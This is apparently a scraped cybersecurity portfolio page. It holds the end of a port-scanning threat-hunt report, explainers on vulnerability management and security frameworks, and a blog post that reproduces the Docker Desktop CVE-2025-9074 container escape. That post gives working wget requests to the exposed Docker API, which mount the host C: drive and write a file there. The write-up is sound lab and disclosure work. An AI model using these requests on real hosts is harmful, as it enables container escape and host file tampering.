Throughout the course of this investigation, I documented every major step and observation to ensure a clear understanding of how the event unfolded. The investigation began with an initial hypothesis of possible internal misuse, which evolved into the discovery of systematic port scanning. Each query used in Defender for Endpoint was recorded alongside its findings to form an evidence trail.

This documentation not only captured the technical steps taken, such as verifying logs, pivoting between tables, and confirming the script execution but also reflected the reasoning behind each action. Maintaining detailed documentation like this allows for transparency, consistency, and reproducibility in future hunts. It also helps build reference material that can be used by other analysts for similar incidents, ensuring the organization's knowledge base grows with every investigation.

## Improvement

After analyzing the entire scenario, several improvement points were identified. First, it became clear that PowerShell execution policies were too relaxed in this environment. Restricting PowerShell to only run signed scripts would immediately reduce the risk of arbitrary script execution.

Second, the internal network lacked segmentation, allowing one compromised host to communicate freely with all others. In a real corporate setup, proper network segmentation would ensure that unnecessary east-west traffic is limited and monitored.

Third, implementing automated alerting for abnormal internal traffic patterns, such as repeated connection failures to sequential ports, would enable the SOC team to detect similar behavior earlier. Additionally, conducting proactive threat hunts on a routine basis helps catch reconnaissance activities before they evolve into actual compromise events.

Ultimately, this scenario reinforced the importance of combining technical detection with procedural discipline, ensuring every hunt improves the overall security posture of the environment.

## Conclusion

The sudden network slowdown was traced to a PowerShell-based port scanning script executed under the System account on samson-windows-. Although no active compromise was found, the activity realistically simulated how internal reconnaissance could degrade performance and increase exposure within an unrestricted network.

This hunt demonstrated the power of Microsoft Defender for Endpoint in identifying behavioral anomalies, correlating telemetry across different data sources, and facilitating immediate containment actions.

Through structured investigation and methodical documentation, this exercise emphasized how internal misconfigurations or unauthorized automation can lead to observable network symptoms, and how disciplined threat hunting can quickly uncover their root cause.

## Important Link

If you are interested in joining the [CYBER-RANGE COMMUNITY](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5) or following along with the labs, you can check it out here: [LINK](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5)

18:T206f,Containers have revolutionized how we build, ship, and deploy applications. Unlike virtual machines, which package an entire operating system alongside the application, containers provide only the code and its dependencies, running on the host kernel. This makes them lightweight, portable, and fast to deploy.

In my home lab, I rely heavily on Docker for running security tools, test environments, and quick experiments. Containers allow me to isolate different services, but this isolation comes with a caveat: it is only as strong as the implementation behind it. A recently disclosed flaw, CVE-2025-9074, demonstrates that container isolation can be far weaker than we think. This vulnerability revealed a simple oversight in Docker Desktop that allowed full host compromise from any container with just two HTTP requests.

## The Vulnerability

CVE-2025-9074 affected Docker Desktop on Windows and macOS prior to version 4.44.3. The issue was that the Docker API, which should have been restricted, was accessible from any container without authentication. From there, an attacker could create a privileged container, mount the host's C: drive, and interact directly with the filesystem.

The result was a complete breakdown of container boundaries. An attacker did not need complex exploitation chains or advanced privilege escalation tricks. With only two requests to the Docker API, isolation was shattered. This vulnerability carried a severity score of 9.3 out of 10, which reflects its potential impact.

## Discovery Story

The researcher, Felix Boulet, uncovered this flaw almost by accident. While scanning the internal environment of a container with Nmap, he noticed the exposed Docker API on the network. Out of curiosity, he probed it further and quickly realized that it accepted unauthenticated requests. This allowed him to interact directly with the Docker daemon, the central service responsible for creating and managing containers.

Collaborating with Philippe Dugre, another container expert, Felix confirmed that the same oversight affected macOS as well. The discovery was a reminder that sometimes the most dangerous bugs come from the simplest assumptions: "internal" services are not always safe by default.

## Technical Walkthrough

In theory, Docker containers should remain jailed. They operate in separate namespaces, cannot touch the host filesystem unless explicitly configured, and are prevented from interfering with one another. In this case, however, the Docker API (192.168.65.7:2375) was wide open.

The exploit worked in two steps. First, the attacker would send a POST request to create a new container that bound the host's C: drive into the container at a directory called /host_root. A simple command could then be specified to write or read files from that mount point. Second, another POST request would start the container, executing the command against the host filesystem.

This was enough to create arbitrary files on the host, steal sensitive data, or prepare persistence mechanisms such as startup tasks or scheduled jobs. It did not require direct code execution on the container—an SSRF vulnerability in a containerized web application could have been enough to trigger it.

## Demonstration: From Container to Host

To verify the Docker Desktop escape vulnerability, I reproduced the proof of concept on my own test system running Docker Desktop 4.44.1 (vulnerable). Below is a walk-through of the key steps.

### Step 1: Launch a Container

I started with a lightweight Alpine container and opened an interactive shell:

**Terminal →**

`docker run -it alpine /bin/sh`

This dropped me into a root shell inside the container, ready to issue commands.

### Step 2: Confirm API Exposure

Inside the container, I confirmed that the internal Docker API was reachable at http://192.168.65.7:2375.

**Terminal →**

`wget --timeout=3 --tries=1 -qO- http://192.168.65.7:2375/_ping`

The expected response is simply:

**Terminal →**

`OK`

This confirmed that the container could talk directly to the Docker service API on the host.

### Step 3: Create a Privileged Container with Host Mount

Next, I issued a POST request to create a new container with the host C: drive mounted. The JSON payload instructed Docker to bind the Windows host C:\ drive into the container at /host_root and to write a test file:

**Terminal →**

`wget --header='Content-Type: application/json' \ --post-data='{"Image":"alpine","Cmd":["sh","-c","echo pwned > /host_root/pwn.txt"],"HostConfig":{"Binds":["/mnt/host/c:/host_root"]}}' \ -O - http://192.168.65.7:2375/containers/create > create.json`

The output returned a container ID:

**Terminal →**

`{"Id":"8cd5867ade9a5b73409763d03907d2ef321b90064fac16b63eddfb0e488e9571","Warnings":[]}`

This meant the container had been created with access to the host file system.

### Step 4: Start the Container

With the container created, I started it using another simple POST:

**Terminal →**

`cid=$(cut -d'"' -f4 create.json) wget --post-data='' -O - http://192.168.65.7:2375/containers/$cid/start`

The expected response was an empty body with a 204 status code, meaning the container successfully started.

### Step 5: Verify Host Compromise

Finally, I checked the Windows C:\ drive for the file written by the container:

**Terminal →**

`C:\docker_cve_test\pwn.txt`

The file contained the word:

**Terminal →**

`pwned`

This confirmed that the container had broken isolation and was able to write directly to the host file system, proving the vulnerability in action.

<InlineGallery images={docker-cve-demonstration} title="Docker CVE-2025-9074 Proof of Concept Demonstration" />

**⚠️ Safety Note**

This demonstration was carried out in a controlled lab environment using an intentionally vulnerable version of Docker Desktop. Do not attempt this on production systems, work laptops, or any environment that contains sensitive data. Always use isolated test machines when experimenting with security vulnerabilities.

## Why It Matters

This vulnerability illustrates how dangerous it is to assume internal APIs or control planes are inherently safe. In a production environment, it could have meant a malicious container escaping its sandbox entirely, with access to host data and applications. Even in my home lab, where Docker is often used for security testing, this flaw was a reminder that one container could have compromised the entire environment.

The real danger lies in how easy it was. Just two HTTP requests were enough to undo Docker's core promise of isolation.

## Lessons Learned

The patch in version 4.44.3 closed the hole, but the lessons extend far beyond Docker itself. Every internal service should require authentication, no matter how "hidden" it seems. Network segmentation between containers and the host must be enforced, and zero-trust principles should apply within containerized environments just as much as they do at the perimeter.

Regular scanning of container networks is equally important. Felix discovered this flaw simply by running Nmap on the documented private Docker network. Had organizations been running similar checks, they might have caught the issue themselves.

## Conclusion

CVE-2025-9074 serves as a critical reminder: container isolation is not infallible. For anyone running Docker Desktop on Windows or macOS, updating to version 4.44.3 or later is essential. For security professionals, the vulnerability reinforces the need to test assumptions, audit internal interfaces, and apply zero-trust principles throughout the environment.

In my own lab, Docker remains a powerful and flexible tool, but this experience has reinforced the need for vigilance. Even mature platforms can harbor oversights, and sometimes, breaking out of a container is as easy as running two lines of code.

## Further Reading

For further details, you can explore:

- [CVE-2025-9074 Record](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-9074)
- [Docker Desktop 4.44.3 Release Notes](https://docs.docker.com/desktop/release-notes/)
- [Felix Boulet's Original Write-up](https://blog.qwertysecurity.com/Articles/blog3.html)19:T24f4,Cybersecurity relies heavily on effective vulnerability management. It's more than just scanning systems and applying patches, it's about identifying risks, anticipating threats, and maintaining an ongoing process that keeps exposure to a minimum. Over the past few weeks, I've been exploring this through the Cyber Range program, getting both the theory and practical experience of enterprise-level vulnerability management.

This post is my reflection and documentation of that journey, looking at what vulnerabilities are, why they matter, and how we can turn vulnerability management into a structured, repeatable practice that actually strengthens security.

## What is Vulnerability Management?

At its core, a vulnerability is simply a weakness in a system, whether software, hardware, configuration, or even human processes, that can be exploited to cause harm. Think of a padlock that looks solid but is rusted on the inside. To the outside world, it looks secure, but it's only a matter of time before someone with the right tools gets through.

In cybersecurity, these weaknesses could be outdated operating systems, unpatched applications like Java or Adobe Reader, weak or missing passwords, or misconfigured firewalls. Left unchecked, vulnerabilities multiply over time, creating opportunities for attackers to compromise systems.

Vulnerability management (VM) is the discipline of continuously identifying, assessing, prioritizing, remediating, and verifying vulnerabilities across an environment. The goal is simple: reduce organizational risk and prevent vulnerabilities from spiraling out of control.

## Vulnerabilities and Zero-Days

Not all vulnerabilities are created equal. Some are well-known and regularly patched, while others lurk in the shadows waiting to be exploited.

The three most common categories I've been working with are:

1. Outdated third-party applications – e.g., browsers, Java, or Adobe Reader that haven't been patched.
2. Outdated operating systems or firmware – systems that miss critical updates.
3. Poor configurations – such as no password, weak password policies, or insecure protocols.

Beyond these, we also consider physical vulnerabilities (like an unlocked server room), human-related vulnerabilities (such as poor hiring processes or lack of security awareness), and environmental vulnerabilities (e.g., data centers built on flood plains).

And then, there are zero-days, previously unknown vulnerabilities that have no patch available. Zero-days are the most dangerous because defenders don't see them coming. They can command millions on the black market or even be weaponized by nation states. Famous cases like Pegasus highlight just how devastating a zero-day can be.

This is why VM isn't optional. It's a continuous process to stay one step ahead, reduce known risks, and contain the impact of unknowns.

## Risk, Threats, and Exploits

One key lesson I've reinforced is understanding how risk, threats, vulnerabilities, and exploits all connect.

1. Vulnerability - the weakness (e.g., outdated web server).
2. Threat - the potential bad outcome (e.g., data breach).
3. Threat actor - the entity carrying it out (e.g., a hacker group, insider, or state-sponsored adversary).
4. Exploit - the method of taking advantage of the vulnerability (e.g., code injection).
5. Risk - the likelihood of a threat exploiting a vulnerability to cause harm.

Risk is usually calculated as likelihood × impact. For example, if all animals in the world suddenly turned against humans, the impact would be catastrophic, but the likelihood is zero, so the risk is zero. In cybersecurity, more realistic examples include:

1. A ransomware outbreak due to poor patch management.
2. A phishing campaign succeeding because of a lack of security awareness training.
3. A flood taking down a data center because of poor environmental planning.

## The Lifecycle of Vulnerability Management

Vulnerability management isn't a one-time project. It's a continuous lifecycle that repeats forever. The steps generally look like this:

1. Discover – Identify assets and scan them for vulnerabilities.
2. Assess – Review the findings and understand their impact.
3. Prioritize – Decide what to fix first based on severity and asset criticality.
4. Report – Share findings with stakeholders and create remediation plans.
5. Remediate – Fix vulnerabilities (patch, reconfigure, remove, or mitigate).
6. Verify – Rescan to ensure remediation was successful.

And then? Repeat.

The lifecycle never truly ends. New assets come online, new vulnerabilities are discovered, and old systems reintroduce issues (sometimes because someone reinstalled Firefox on a server you just patched). That's why VM is as much about process discipline as it is about technology.

## Specialized Concepts in Vulnerability Management

As I've gone deeper, I've worked with several core standards and frameworks that form the backbone of vulnerability management across the industry:

1. CVE (Common Vulnerabilities and Exposures): A standardized list of known vulnerabilities.
2. CWE (Common Weakness Enumeration): A catalog of software coding flaws developers should avoid.
3. CVSS (Common Vulnerability Scoring System): A universal scoring method (0–10) to measure vulnerability severity.
4. NVD (National Vulnerability Database): The US government's central repository for vulnerability data.
5. OWASP Top 10: A widely used list of the most critical web application vulnerabilities.

These frameworks give us a shared language for categorizing and prioritizing risks. For example, a CVSS score of 9.8 means a vulnerability is critical and should be patched immediately, especially if it's on a mission-critical or internet-facing system.

## Roles, Responsibilities, and Risk Responses

Vulnerability management doesn't happen in isolation. Different teams have different roles in the process:

1. Security Operations (SOC): Discover and verify vulnerabilities through scanning.
2. Risk/GRC Teams: Assess, prioritize, and report on vulnerabilities in the context of organizational risk.
3. IT/Engineering Teams: Carry out the actual remediation work.
4. Leadership/Stakeholders: Provide buy-in and accept risk when necessary.

This separation of duties is essential for accountability. The person discovering vulnerabilities shouldn't be the same one fixing them without oversight.

And when vulnerabilities are discovered, organizations typically respond in four ways:

1. Avoid – Remove the system entirely.
2. Mitigate – Patch or reconfigure to reduce risk.
3. Transfer – Shift responsibility (e.g., cyber insurance or leadership sign-off).
4. Accept – Document and live with the risk if it can't be avoided.

## Challenges and Real-World Nuance

On paper, VM looks simple. In practice, things get messy.

1. Immature programs often lack staff, processes, or tools to handle remediation at scale.
2. Diverse environments (IoT devices, SCADA systems, legacy infrastructure) make uniform patching almost impossible.
3. Operational disruptions are common — fixing one vulnerability can break mission-critical applications.
4. Human factors — politics, silos, and resistance, often create bigger barriers than the technical work.

In interviews or practical scenarios, knowing these details separates someone who's read about VM from someone who has actually practiced it.

## Implementing a Vulnerability Management Program

From my experience and training, the general steps to building a VM program from scratch are:

1. Asset inventory – Know what you own, both hardware and software.
2. Categorize assets – Define which are critical, public-facing, or low-value.
3. Define risk response scenarios – Plan for routine, emergency, and unpatchable situations.
4. Assign maintenance groups – Server, network, endpoint, IoT, each group owns its assets.
5. Create a policy – Document expectations, SLAs, and escalation paths with leadership buy-in.
6. Initiate the lifecycle – Begin scanning, remediating, and reporting.
7. Measure and improve – Track time-to-detect, time-to-remediate, and closure rates.

This structured approach not only keeps organizations secure but also builds the evidence base for compliance, audits, and future investment in security maturity.

## Conclusion

Vulnerability management isn't glamorous. It's repetitive, sometimes frustrating, and often underappreciated. But it's one of the most critical functions in cybersecurity. Done well, it not only reduces risk but also strengthens an organization's overall resilience.

Through the Cyber Range program, I've been able to explore both the theory and the hands-on application of enterprise vulnerability management, working with real platforms like Tenable, applying standards like CVSS and CVE, and simulating the lifecycle from discovery through remediation.

For me, this is more than a class. It's another building block in my journey as a cybersecurity professional, refining my skills, expanding my toolkit, and preparing to implement effective vulnerability management programs in the real world.

## Important Link

If you're interested in joining the Cyber Range community or following along with similar projects, check it out here: [Cyber Range Community](https://skool.com/cyber-range)1a:T2395,As cybersecurity keeps shifting, frameworks and policies provide the stability organizations rely on to stay protected. Without them, most security programs become reactive and inconsistent, leaving systems exposed to both opportunistic attackers and sophisticated adversaries. Frameworks provide a strategic foundation for building defenses, while policies turn those frameworks into real-world, enforceable practices that shape day-to-day decisions.

For example, a healthcare provider was suddenly hit by a ransomware attack. Without proper frameworks or clear incident response policies, the IT staff scrambled in an uncoordinated way. Critical records were lost, employees were confused about communication protocols, and services were disrupted for weeks. Contrast this with an organization that has adopted the NIST Cybersecurity Framework alongside HIPAA-compliant policies. In such a case, proactive backups, role-based access controls, network segmentation, and tested recovery drills would be in place. This level of preparedness does not eliminate attacks, but it ensures the impact is minimized and recovery is swift.

## Core Cybersecurity Frameworks

### 1. NIST Cybersecurity Framework (CSF)

The NIST Cybersecurity Framework is one of the most widely used globally. It organizes cybersecurity activities into five functions: Identify, Protect, Detect, Respond, and Recover. These functions form a continuous cycle of improvement that organizations can adapt to their unique environments. For instance, in a financial services company, critical assets such as customer data are identified, protective measures like encryption and multi-factor authentication are enforced, anomalies are detected using SIEM tools, responses are automated through playbooks, and recovery is supported by well-tested backups. This structure not only reduces risk but also ensures executives understand and support security as part of organizational strategy.

### 2. ISO/IEC 27001 and 27002

ISO/IEC 27001 and 27002 are international standards that provide a globally recognized approach to information security management. They emphasize a policy-driven structure where organizations must document processes, apply technical and administrative controls, and commit to continuous improvement. A growing e-commerce company, for example, can leverage ISO 27001 certification to demonstrate reliability to customers worldwide. Certification provides confidence to business partners, assures regulators, and creates a repeatable system for managing risks across multiple regions.

### 3. CIS Critical Security Controls

For organizations with limited resources, the CIS Controls offer an accessible entry point into structured cybersecurity. These controls prioritize actions such as asset management, secure configuration, patching, and boundary defense. A startup that may not be able to implement ISO immediately can achieve meaningful improvements by applying the first few CIS Controls, thereby closing gaps that attackers often exploit. Within weeks, the organization can drastically reduce its attack surface and gain visibility into vulnerabilities that were previously ignored.

### 4. COBIT

COBIT is primarily a governance and management framework for enterprise IT, but its role in cybersecurity is significant. It ensures IT and security activities align directly with business goals, bridging the frequent disconnect between executives and technical teams. During high-stakes events such as mergers, COBIT can ensure intellectual property, data integration, and compliance requirements are treated as strategic risks, not just technical issues.

### 5. MITRE ATT&CK

MITRE ATT&CK has become indispensable in modern SOC operations. It is a knowledge base of adversary tactics, techniques, and procedures observed in real-world attacks. Analysts use it to map incidents, assess detection coverage, and prioritize engineering improvements. For example, a SOC team investigating phishing might discover that while they detect credential dumping, they have no coverage for lateral movement. By consulting ATT&CK, they identify these gaps and design new detection rules. Many organizations now embed ATT&CK directly into SIEM dashboards to track detection capability across the attack lifecycle.

## Compliance and Regulatory Frameworks

In addition to voluntary frameworks, regulatory standards impose legal obligations. Healthcare organizations must comply with HIPAA, financial institutions must follow PCI DSS, and any company processing data of European citizens must align with GDPR. Failure to comply not only risks fines but also damages public trust.

A notable example is the fine levied on British Airways after attackers compromised customer data. The organization was penalized millions, and the reputational damage lingered long after the financial penalty was paid. Compliance frameworks are therefore, not just regulatory hurdles but essential drivers of good security practices. They compel organizations to adopt encryption, audit logging, privacy protections, and access control measures that reduce the likelihood of breaches even when not legally mandated.

## National and Sector-Specific Frameworks

Cybersecurity is not a one-size-fits-all discipline, and national or sector-specific frameworks reflect this reality. In the United Kingdom, Cyber Essentials provides a baseline set of practices, including patch management, anti-malware protection, and firewall configuration. It is often required for businesses working with government agencies. The European Union introduced the NIS Directive to enhance resilience in critical infrastructure sectors such as energy, healthcare, and transport. In the United States, SOC 2 is widely used among service providers to prove trustworthiness to clients, while FedRAMP ensures cloud services meet federal standards before agencies adopt them.

Each of these frameworks responds to different needs. A small consultancy in London may focus on Cyber Essentials to reassure clients of its security posture, while a major cloud provider must navigate the rigorous FedRAMP process. The diversity of frameworks reflects the global effort to tailor cybersecurity measures to an organisation's size, industry, and jurisdiction.

## Policy-Level Concepts

Frameworks offer strategy, but policies operationalize that strategy. Every organization should have clearly defined policies that govern acceptable use, access control, incident response, and business continuity.

An Acceptable Use Policy defines how employees can and cannot use corporate resources, reducing risks of negligence or insider misuse. Access Control Policies enforce least privilege principles, ensuring employees have only the permissions necessary for their roles. Incident Response Policies establish communication chains and response playbooks, reducing confusion during real-world incidents. Finally, Business Continuity and Disaster Recovery Plans ensure that when disruptions occur, systems are restored quickly and downtime is minimized.

The Colonial Pipeline attack in 2021 showed the consequences of inadequate policies. The organization's lack of comprehensive disaster recovery planning extended downtime, caused fuel shortages, and created national-level disruption. Policies, when tested and enforced, ensure that frameworks deliver tangible protection rather than existing as theoretical documents.

## How Frameworks and Policies Work Together

While each framework and policy can be valuable on its own, their real strength lies in combination. A SOC team might use MITRE ATT&CK to understand adversary behavior, ISO 27001 to manage risk through a structured ISMS, and GDPR policies to ensure compliance with data privacy obligations. Together, these create a layered defense that is proactive rather than reactive.

Organizations that combine multiple frameworks often find they improve not only their technical defenses but also their ability to communicate risks and improvements to executives, regulators, and customers. This approach builds trust and makes organizations more resilient. It also shows that security isn't just a technical issue, but a key part of running the business.

## Conclusion

There is no single cybersecurity framework that fits every organization. Most enterprises adopt a mix of NIST CSF, ISO 27001, CIS Controls, and MITRE ATT&CK, tailoring them to industry needs, organizational size, and risk appetite. Policies then bring these frameworks to life by embedding rules into daily operations.

The most important realization is that frameworks and policies are not simply compliance checklists or bureaucratic exercises. They are strategic enablers that reduce risk, protect reputation, and support business continuity. Cyber threats change every day, so organizations need to update their frameworks and policies just as quickly. Security professionals who understand how these two work together not only stop attacks but also help build trust and keep businesses resilient.9:["$","div",null,{"className":"min-h-screen bg-background","children":["$","main",null,{"children":[["$","$L12",null,{}],["$","$L13",null,{"projects":[{"slug":"project-5-4-log-n-pacific-internship-threat-hunting-scenario4","title":"Project 5.4: LOG(N) Pacific Internship: Threat Hunting Scenario 4: PwnCrypt Ransomware Outbreak","description":"A comprehensive threat hunting exercise investigating a PwnCrypt ransomware outbreak, using Microsoft Defender for Endpoint to analyze file encryption activities, process execution chains, and ransomware indicators of compromise.","date":"2025-10-24","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Threat Hunting","Microsoft Defender for Endpoint","Ransomware Analysis","Incident Response","EDR","KQL","PowerShell"],"content":"$14","image":"/images/projects/Zero-day-red.jpg","technologies":["Microsoft Defender for Endpoint","KQL","PowerShell","Windows"],"images":[],"series":{"name":"Project 5.4: LOG(N) Pacific Internship: Threat Hunting Scenario 4: PwnCrypt Ransomware Outbreak","order":4}},{"slug":"project-5-3-log-n-pacific-internship-threat-hunting-scenario3","title":"Project 5.3: LOG(N) Pacific Internship: Threat Hunting Scenario 3: Suspected Data Exfiltration","description":"A comprehensive threat hunting exercise investigating suspected data exfiltration by a disgruntled employee, using Microsoft Defender for Endpoint to identify unauthorized archiving and data transfer activities within the network.","date":"2025-10-20","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Threat Hunting","Microsoft Defender for Endpoint","Data Exfiltration","Insider Threat","EDR","KQL","PowerShell"],"content":"$15","image":"/images/projects/Suspected Data Exfiltration.jpeg","technologies":["Microsoft Defender for Endpoint","KQL","PowerShell","Windows"],"images":[],"series":{"name":"Project 5.3: LOG(N) Pacific Internship: Threat Hunting Scenario 3: Suspected Data Exfiltration","order":3}},{"slug":"project-5-2-log-n-pacific-internship-threat-hunting-scenario2","title":"Project 5.2: LOG(N) Pacific Internship: Threat Hunting Scenario 2: Sudden Network Slowdown","description":"A comprehensive threat hunting exercise investigating sudden network performance degradation caused by internal port scanning activity, using Microsoft Defender for Endpoint to identify unauthorized reconnaissance within the network.","date":"2025-10-14","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Threat Hunting","Microsoft Defender for Endpoint","Network Security","Port Scanning","EDR","KQL","PowerShell"],"content":"$16","image":"/images/projects/Windows Defender Fir..._imresizer.jpg","technologies":["Microsoft Defender for Endpoint","KQL","PowerShell","Windows"],"images":[],"series":{"name":"Project 5.2: LOG(N) Pacific Internship: Threat Hunting Scenario 2: Sudden Network Slowdown","order":2}}]}],["$","$L17",null,{"blogPosts":[{"slug":"cve-2025-9074-docker-desktop-vulnerability","title":"Breaking Out: Understanding CVE-2025-9074 in Docker Desktop","excerpt":"A deep dive into CVE-2025-9074, a critical vulnerability in Docker Desktop that allowed complete host compromise from any container with just two HTTP requests.","content":"$18","date":"2025-09-05","author":"Samson Otori","category":"Insights","readTime":8,"image":"/images/blog/docker security BReach NEW.png","tags":["CVE","Docker","Container Security","Vulnerability Analysis","Exploit","Zero Trust","Security Research"]},{"slug":"vulnerability-management-explained","title":"Vulnerability Management Explained: What Every Cybersecurity Professional Needs to Master","excerpt":"A comprehensive guide to vulnerability management, covering core concepts, lifecycle processes, and practical implementation strategies for cybersecurity professionals.","content":"$19","date":"2025-09-03","author":"Samson Otori","category":"Foundations","readTime":7,"image":"/images/blog/Vulnerability Management Image NEW.png","tags":["Vulnerability Management","Cybersecurity","Risk Management","Security Operations","Best Practices"]},{"slug":"practical-guide-cybersecurity-frameworks-policies","title":"A Practical Guide to Cybersecurity Frameworks and Policies","excerpt":"In the constantly evolving landscape of cybersecurity, frameworks and policies have become the backbone of how organizations protect their systems, safeguard their data, and respond to emerging threats. This comprehensive guide explores the core frameworks, compliance requirements, and practical implementation strategies that form the foundation of effective cybersecurity programs.","content":"$1a","date":"2025-08-31","author":"Samson Otori","category":"Foundations","readTime":12,"image":"/images/blog/zero-trust-image.jpg","tags":["Cybersecurity Frameworks","NIST CSF","ISO 27001","MITRE ATT&CK","Compliance","Security Policies","Risk Management","SOC Optimization"]}]}]]}]}]
e:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}]]
b:null
c:null
10:[["$","title","0",{"children":"Samson's | Cybersecurity Portfolio"}],["$","meta","1",{"name":"description","content":"Professional cybersecurity portfolio showcasing expertise in digital security"}],["$","meta","2",{"name":"generator","content":"v0.dev"}],["$","link","3",{"rel":"icon","href":"https://hebbkx1anhila5yf.public.blob.vercel-storage.com/117%20Corporation%20no%20bg-5VVBXF0igK8jcCo43su7cpA2isco7t.png"}]]
